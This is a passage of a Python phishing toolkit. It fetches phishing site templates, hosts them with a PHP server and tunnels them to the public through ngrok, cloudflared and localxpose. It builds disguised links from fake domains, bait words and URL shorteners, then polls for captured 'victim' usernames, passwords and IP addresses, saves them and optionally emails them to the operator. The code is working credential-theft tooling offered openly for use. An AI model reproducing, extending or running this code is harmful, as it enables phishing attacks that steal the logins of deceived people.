                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
            elif architecture.find("x86_64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
            else:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
            if isfile("ngrok.tgz"):
                extract("ngrok.tgz", f"{root}/.tunneler")
                remove("ngrok.tgz")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                    extract("ngrok.zip", f"{root}/.tunneler")
                    remove("ngrok.zip")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                    extract("cloudflared.tgz", f"{root}/.tunneler")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
            elif architecture.find("arm64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                    extract("ngrok.zip", f"{root}/.tunneler")
                    remove("ngrok.zip")
                if not iscloudflared:
                    print(f"{error}Device architecture unknown. Download cloudflared manually!")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
            else:
                print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        if isfile("loclx.zip"):
            extract("loclx.zip", f"{root}/.tunneler")
            remove("loclx.zip")
        for tunneler in tunnelers:
            if isfile(f"{root}/.tunneler/{tunneler}"):
                system(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if system(f"pidof {process} > /dev/null 2>&1")==0:
            sprint(f"{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    system("rm -rf $HOME/.site && mkdir $HOME/.site")
    ngrok_token()
    if not isfile(email_file):
        return
    with open(email_file) as email_data:
        email_config = email_data.read()
        if is_json(email_config):
            data = loads(email_config)
            email = data["email"]
            password = data["password"]
            receiver = data["receiver"]
            # As the server is of gmail, we only allow gmail login
            if email.find("@gmail.com")!=-1:
                is_mail_ok = True
            else:
                print(f"\n{error}Only gmail with app password is allowed")
                sleep(1)


# 3rd function checking requirements and download files 
def requirements(folder):
    if isfile("websites.zip"):
        system(f"rm -rf {websites_dir}/*")
        extract("websites.zip", websites_dir)
        remove("websites.zip")
    if exists("sites"):
        system(f"rm -rf {websites_dir}")
        system(f"cp -r sites {websites_dir}")
    if isfile(f"{websites_dir}/version.txt"):
        with open(f"{websites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                download(websites_url, "websites.zip")
    else:
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        system(f"rm -rf {websites_dir}/*")
        extract("websites.zip", websites_dir)
        remove("websites.zip")
    site = f"{websites_dir}/{folder}"
    if exists(f"{root}/.websites/{folder}"):
        system(f"cp -r {site}/* $HOME/.site")
    else:
        internet()
        system("rm -rf site.zip")
        download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
        if not exists(f"{websites_dir}/{folder}"):
            mkdir(site)
        extract("site.zip", site)
        remove("site.zip")
        system(f"cp -r {site}/* $HOME/.site")
    server()

# Start server and tunneling
def server():
    system("clear")
    sprint(logo, 0.01)
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        write_error(e)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system('find "$HOME/.tunneler" -name "*.log" -delete')
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.tunneler && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.tunneler && termux-chroot ./cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
        system(f"echo 'cd $HOME/.tunneler && termux-chroot ./loclx tunnel http --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
    # Use installed ngrok and cloudflared and localxpose in mac
    elif brew and ngrok and cloudflared and loclx:
        system(f"ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.tunneler && cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
        system(f"echo 'cd $HOME/.tunneler && localxpose tunnel http --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
    else:
        system(f"cd $HOME/.tunneler && ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.tunneler && ./cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
        system(f"echo 'cd $HOME/.tunneler && ./loclx tunnel http --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
    sleep(10)
    try:
        ngrok_api = get("http://127.0.0.1:4040/api/tunnels").json()
        ngrok_url = ngrok_api["tunnels"][0]["public_url"]
    except Exception as e:
        write_error(e)
        ngrok_url = ""
    if ngrok_url.find("ngrok")!=-1:
        ngrok_success=True
    else:
        ngrok_success=False
    for i in range(10):
        if isfile(f"{root}/.tunneler/cf.log"):
            cf_url = popen("cat $HOME/.tunneler/cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read().strip()
            sleep(1)
        else:
            cf_url = ""
            sprint(f"\n{error}Cloudflared failed to start!{nc}")
        if cf_url.find("cloudflare")!=-1:
            cf_success=True
            break
        else:
            cf_success=False
    for i in range(10):
        if isfile(f"{root}/.tunneler/loclx.log"):
            loclx_url = "https://" + popen("cat $HOME/.tunneler/loclx.log | grep -o '[-0-9a-z]*\.loclx.io'").read().strip()
            sleep(1)
        else:
            loclx_url = ""
            sprint(f"\n{error}Loclx failed to start!{nc}")
        if loclx_url.find("loclx")!=-1:
            loclx_success=True
            break
        else:
            loclx_success=False
    if ngrok_success and cf_success and loclx_success:
        print(f"\n{success}Ngrok, Cloudflared and Loclx have started successfully!")
        url_manager(cf_url, "1", "2")
        url_manager(ngrok_url, "3", "4")
        url_manager(loclx_url, "5", "6")
        if tunneler.lower() == "ngrok":
            cuask(ngrok_url)
        elif tunneler.lower() == "loclx":
            cuask(loclx_url)
        else:
            cuask(cf_url)
    elif ngrok_success and cf_success and not loclx_success:
        print(f"\n{success}Ngrok and Cloudflared have started successfully!")
        url_manager(cf_url, "1", "2")
        url_manager(ngrok_url, "3", "4")
        if tunneler.lower() == "ngrok":
            cuask(ngrok_url)
        else:
            cuask(cf_url)
    elif loclx_success and cf_success and not ngrok_success:
        print(f"\n{success}Cloudflared and Loclx have started successfully!")
        url_manager(cf_url, "1", "2")
        url_manager(loclx_url, "3", "4")
        if tunneler.lower() == "loclx":
            cuask(loclx_url)
        else:
            cuask(cf_url)
    elif ngrok_success and loclx_success and not cf_success:
        print(f"\n{success}Ngrok and Loclx have started successfully!")
        url_manager(ngrok_url, "1", "2")
        url_manager(loclx_url, "3", "4")
        if tunneler.lower() == "ngrok":
            cuask(ngrok_url)
        else:
            cuask(loclx_url)
    elif ngrok_success and not cf_success and not loclx_success:
        print(f"\n{success}Ngrok has started successfully!")
        url_manager(ngrok_url, "1", "2")
        cuask(ngrok_url)
    elif cf_success and not ngrok_success and not loclx_success:
        print(f"\n{success}Cloudflared has started successfully!")
        url_manager(cf_url, "1", "2")
        cuask(cf_url)
    elif loclx_success and not ngrok_success and not cf_success:
        print(f"\n{success}Loclx has started successfully!")
        url_manager(loclx_url, "1", "2")
        cuask(loclx_url)
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()

# Output urls
def url_manager(url, num1, num2):
    global mask
    if num1=="1":
        sprint(f"\n{info}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")


# Ask to mask url and shadow url
def cuask(url):
    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_meta(metaurl)
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        write_error(e)
        res = ""
    resp = popen(f"echo '{res}' | head -n1").read().strip()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short = resp.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(f"{root}/.site/usernames.txt")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata = ufile.read()
                    if is_mail_ok:
                        send_mail(userdata)
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                # Just add the IP
                system(f"cat $HOME/.site/usernames.txt >> {saved_file}")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(f"{root}/.site/ip.txt")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system(f"cat $HOME/.site/ip.txt | head -n1 >> {saved_file}")
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(f"{root}/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
